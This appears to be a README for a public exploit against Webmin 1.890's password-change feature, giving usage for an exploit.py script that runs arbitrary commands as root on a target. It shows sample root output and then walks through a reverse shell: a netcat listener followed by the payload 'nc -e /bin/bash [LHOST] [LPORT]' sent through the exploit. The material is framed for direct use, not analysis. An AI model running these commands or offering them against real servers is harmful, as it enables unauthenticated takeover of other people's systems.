# WebMin-1.890-Unauthenticated-RCE

Webmin 1.890 is vulnerable to RCE if “user password change” option to be enabled.<br>
# USAGE:
```bash
$ python3 exploit.py [TARGET IP] [COMMAND]
#EXAMPLE
$ python3 exploit.py 127.0.0.1 whoami

```
&lt;h1&gt;Error - Perl execution failed&lt;/h1&gt;<br>
&lt;p&gt;Your password has expired, and a new one must be chosen.<br>
<strong>uid=0(root) gid=0(root) groups=0(root)</strong><br>
&lt;/p&gt;
<br>
<h4>before running script start listener for connection in your machine</h4>
<code>nc -nvlp [LPORT]</code> 
<br><h4>run script</h4>
<code>python3 exploit.py [RHOST] "nc -e /bin/bash [LHOST] [LPORT]" </code> 
